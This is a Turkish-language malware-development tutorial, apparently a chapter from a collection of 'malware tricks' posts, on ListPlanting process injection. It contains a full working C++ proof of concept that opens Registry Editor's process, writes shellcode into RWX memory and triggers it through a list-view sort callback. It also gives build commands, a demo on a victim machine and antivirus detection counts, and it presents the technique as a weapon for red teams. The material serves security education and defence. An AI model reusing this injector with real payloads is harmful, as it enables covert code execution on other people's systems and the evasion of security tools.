\newpage
\subsection{37. zararlı yazılım geliştirme hileleri: Listplanting. C++ örneği.}

﷽

Merhaba siber güvenlik meraklıları ve beyaz hackerlar!    

![injection](./images/81/2022-11-28_03-03.png){width="80%"}    

Bu yazı, kendi araştırmamın bir sonucu olarak yazılmıştır ve kötü amaçlı yazılım geliştiricilerinin kullandığı bir hileyi ele almaktadır: Listplanting.    

`LVM_SORTGROUPS`, `LVM_INSERTGROUPSORTED` ve `LVM_SORTITEMS` mesajlarını kullanarak, bir `ListView` kontrolünün öğelerinin ve gruplarının sıralama davranışları, bireysel tercihlere göre değiştirilebilir. List-view kontrolleri, öğelerin gruplar halinde gösterildiği kullanıcı arayüzü pencereleridir. `SysListView32` kontrolü, bir uygulamanın list-view ayarlarını işlem belleğinde depolar.      

*ListPlanting* bir list-view kontrolü kullanan bir işlemde sanal adres alanına kod kopyalayarak ve ardından bu kodu liste öğelerini sıralamak için özel bir geri arama (callback) olarak kullanarak gerçekleştirilebilir.     

### pratik bir örnek

Şimdi, pratik bir örneğe bakalım. Hile oldukça basittir.     

İlk olarak, bir pencereyi (window handle) alın:     

```cpp
HWND wpw = FindWindow(NULL, (LPCSTR)"Registry Editor");
HWND hw = FindWindowEx(wpw, 0, (LPCSTR)"SysListView32", 0);
```

Sonra, işlem kimliğini (process ID) alın ve işlemi açın (`OpenProcess` ile işlem tanıtıcısını alın):     

```cpp
GetWindowThreadProcessId(hw, &pid);
ph = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
```

Bir sonraki adımda, `VirtualAllocEx` ile `RWX` bellek ayırarak payload'ı "kopyalayın":     

```cpp
mem = VirtualAllocEx(ph, NULL, sizeof(my_payload), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);

// copy payload
WriteProcessMemory(ph, mem, my_payload, sizeof(my_payload), NULL);
```

Son olarak, payload'u tetikleyin:     

```cpp
// trigger payload
PostMessage(hw, LVM_SORTITEMS, 0, (LPARAM)mem);
```

Belgeler [göre](https://learn.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-postmessagea), `PostMessage` - Belirtilen pencereyi oluşturan iş parçacığına bağlı mesaj kuyruğuna bir mesaj yerleştirir ve iş parçacığının mesajı işlemesini beklemeden döner.     

PoC'min tam kaynak kodu:     

```cpp
/*
hack.cpp
code injection Listplanting
author: @cocomelonc
https://cocomelonc.github.io/malware/2022/11/27/malware-tricks-24.html
*/
#include <windows.h>
#include <commctrl.h>
#include <iostream>
#pragma comment (lib, "user32.lib")

unsigned char my_payload[] =
  // 64-bit meow-meow messagebox
  "\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41"
  "\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60"
  "\x3e\x48\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72"
  "\x50\x3e\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac"
  "\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2"
  "\xed\x52\x41\x51\x3e\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48"
  "\x01\xd0\x3e\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x6f"
  "\x48\x01\xd0\x50\x3e\x8b\x48\x18\x3e\x44\x8b\x40\x20\x49"
  "\x01\xd0\xe3\x5c\x48\xff\xc9\x3e\x41\x8b\x34\x88\x48\x01"
  "\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01"
  "\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24\x08\x45\x39\xd1"
  "\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0\x66\x3e\x41"
  "\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e\x41\x8b"
  "\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58"
  "\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
  "\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x49\xc7"
  "\xc1\x00\x00\x00\x00\x3e\x48\x8d\x95\x1a\x01\x00\x00\x3e"
  "\x4c\x8d\x85\x25\x01\x00\x00\x48\x31\xc9\x41\xba\x45\x83"
  "\x56\x07\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd"
  "\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
  "\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
  "\xd5\x4d\x65\x6f\x77\x2d\x6d\x65\x6f\x77\x21\x00\x3d\x5e"
  "\x2e\x2e\x5e\x3d\x00";

int main(int argc, char* argv[]) {
  HANDLE ph;
  DWORD pid;
  LPVOID mem;

  // find window
  HWND wpw = FindWindow(NULL, (LPCSTR)"Registry Editor");
  HWND hw = FindWindowEx(wpw, 0, (LPCSTR)"SysListView32", 0);

  // obtain the process id and try to open process
  GetWindowThreadProcessId(hw, &pid);
  ph = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);

  // allocate RWX memory
  mem = VirtualAllocEx(ph, NULL, sizeof(my_payload), MEM_RESERVE | MEM_COMMIT,
   PAGE_EXECUTE_READWRITE);

  // copy payload
  WriteProcessMemory(ph, mem, my_payload, sizeof(my_payload), NULL);

  // trigger payload
  PostMessage(hw, LVM_SORTITEMS, 0, (LPARAM)mem);

  // free memory
  VirtualFreeEx(ph, mem, 0, MEM_DECOMMIT | MEM_RELEASE);
  CloseHandle(ph);

  return 0;
}
```

Gördüğünüz gibi, her zamanki gibi, basitlik için `meow-meow` messagebox payload'unu kullandım:      

```cpp
unsigned char my_payload[] =
  // 64-bit meow-meow messagebox
  "\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41"
  "\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60"
  "\x3e\x48\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72"
  "\x50\x3e\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac"
  "\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2"
  "\xed\x52\x41\x51\x3e\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48"
  "\x01\xd0\x3e\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x6f"
  "\x48\x01\xd0\x50\x3e\x8b\x48\x18\x3e\x44\x8b\x40\x20\x49"
  "\x01\xd0\xe3\x5c\x48\xff\xc9\x3e\x41\x8b\x34\x88\x48\x01"
  "\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01"
  "\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24\x08\x45\x39\xd1"
  "\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0\x66\x3e\x41"
  "\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e\x41\x8b"
  "\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58"
  "\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
  "\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x49\xc7"
  "\xc1\x00\x00\x00\x00\x3e\x48\x8d\x95\x1a\x01\x00\x00\x3e"
  "\x4c\x8d\x85\x25\x01\x00\x00\x48\x31\xc9\x41\xba\x45\x83"
  "\x56\x07\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd"
  "\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
  "\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
  "\xd5\x4d\x65\x6f\x77\x2d\x6d\x65\x6f\x77\x21\x00\x3d\x5e"
  "\x2e\x2e\x5e\x3d\x00";
```

### demo

Hadi her şeyi aksiyon halinde görelim. "Malware"imizi derleyelim:     

```bash
x86_64-w64-mingw32-g++ -O2 hack.cpp -o hack.exe \
-I/usr/share/mingw-w64/include/ \
-s -ffunction-sections -fdata-sections -Wno-write-strings \
-fno-exceptions -fmerge-all-constants -static-libstdc++ \
-static-libgcc -fpermissive
```

![injection](./images/81/2022-11-28_03-25.png){width="80%"}    

Then, run Registry Editor in the victim machine (`Windows 10 x64` in my case):      

Ardından, hedef makinede (benim durumumda `Windows 10 x64`) Kayıt Defteri  Düzenleyicisini (Registry Editor) çalıştırın:    

![injection](./images/81/2022-11-28_04-11.png){width="80%"}    

Ve `hack.exe` dosyamızı çalıştırın:      

```powershell
.\hack.exe
```

![injection](./images/81/2022-11-28_04-13.png){width="80%"}    

![injection](./images/81/2022-11-28_04-13_1.png){width="80%"}    

Yönetici olarak çalıştırın, çünkü Kayıt Defteri Düzenleyicisine (`regedit.exe`) enjekte etmek için yükseltilmiş ayrıcalıklar gereklidir.         

Doğruluk için, `Process Hacker 2`'yi de Yönetici olarak çalıştırın ve *memory* sekmesini kontrol edin:      

![injection](./images/81/2022-11-28_04-16.png){width="80%"}    

![injection](./images/81/2022-11-28_04-18.png){width="80%"}    

Gördüğünüz gibi, her şey mükemmel çalışıyor :)      

Şimdi `hack.exe`'yi VirusTotal'a yükleyelim:    

![injection](./images/81/2022-11-28_04-21.png){width="80%"}    

**Sonuç olarak, 71 antivirüs motorundan 19 tanesi dosyamızı zararlı olarak algıladı.**    

[https://www.virustotal.com/gui/file/a1037630f95f721c6a7a1b6d8c278b4e926253b3888ac838d507af8c8baf8844/detection](https://www.virustotal.com/gui/file/a1037630f95f721c6a7a1b6d8c278b4e926253b3888ac838d507af8c8baf8844/detection)     

Bu teknik, [InvisiMole](https://attack.mitre.org/software/S0260/)'da kullanılıyor. InvisiMole, *InvisiMole* Grubu tarafından en azından 2013 yılından beri kullanılan modüler bir casus yazılım yazılımıdır.      

Umarım bu yazı, mavi takım üyelerine bu ilginç teknik hakkında farkındalık kazandırır ve kırmızı takım üyelerinin cephanelerine bir silah ekler.      

[ATT&CK MITRE: ListPlanting](https://attack.mitre.org/techniques/T1055/015/)      
[InvisiMole](https://attack.mitre.org/software/S0260/)     
[PostMessage](https://learn.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-postmessagea)     
[Github'taki kaynak kod](https://github.com/cocomelonc/meow/tree/master/2022-11-27-malware-tricks-24)       
